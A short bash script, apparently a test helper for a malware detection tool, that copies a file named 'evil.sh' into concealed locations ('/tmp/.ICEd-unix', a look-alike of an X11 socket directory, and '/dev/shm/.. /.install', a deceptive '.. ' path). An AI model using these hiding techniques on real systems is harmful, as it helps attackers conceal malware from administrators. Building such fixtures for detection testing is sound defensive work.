#!/bin/bash

usage() {
    echo "Usage: $0 [ -t targdir ] [ -i includedir ]"
    exit 1;
}

includedir=''
targetdir=''
while getopts "i:t:" opts; do
    case ${opts} in
	i) includedir=${OPTARG}
	   ;;
	t) targetdir=${OPTARG}
	   ;;
	*) usage
	   ;;
    esac
done

[[ -z "$includedir" ]] && includedir=$(dirname $0)/include

if [[ ! -x "$includedir/evil.sh" ]]; then
    echo Cannot locate $includedir/evil.sh
    usage
fi

mkdir -p /tmp/.ICEd-unix
cp "$includedir/evil.sh" /tmp/.ICEd-unix/.src.sh
mkdir -p '/dev/shm/.. /.install'
cp "$includedir/evil.sh" '/dev/shm/.. /.install/ewrBPFx.sh'
